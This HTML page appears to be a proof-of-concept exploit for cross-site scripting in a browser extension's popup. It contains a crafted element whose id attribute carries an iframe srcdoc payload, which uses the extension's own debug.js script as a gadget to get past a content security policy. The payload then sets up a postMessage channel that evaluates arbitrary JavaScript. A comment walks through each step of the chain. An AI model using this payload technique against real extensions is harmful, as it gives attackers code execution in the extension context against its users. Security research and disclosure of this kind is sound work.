<!doctype html>
<meta charset="utf-8">
<div id=this></div>
<is></is>
<hard class=to id=understand but=also></hard>
<not>
    <div class="very easy" id="<iframe srcdoc=&quot;<script src='/popup/debug.js' expression='parent.addEventListener(`message`, e=>e.source.postMessage(eval(e.data),`*`)),top.postMessage(`xss`,`*`),`oh oh...`'></script>&quot;>"></div>
</not>

<!--
How the payload works:
1. the div.very.easy element will be removed by the extension, leading to XSS
   in the popup origin (iframe)
2. the id attribute is passed into innerHTML without sanitization
3. CSP allows only 'self' and 'unsafe-eval', but not 'unsafe-inline',
   so we load a srcdoc iframe that contains a script tag (otherwise it would not be execute)
4. we abuse /popup/debug.js from the extension as a gadget
5. the script is basically used like this:
   <script src="/popup/debug.js" expression="alert(1)"></script>
6. the expression attribute is simply eval()d
7. the payload installs a messaging mechanism in the parent, which is the popup
   iframe
8. that allows us to eval arbitrary JS in there
-->
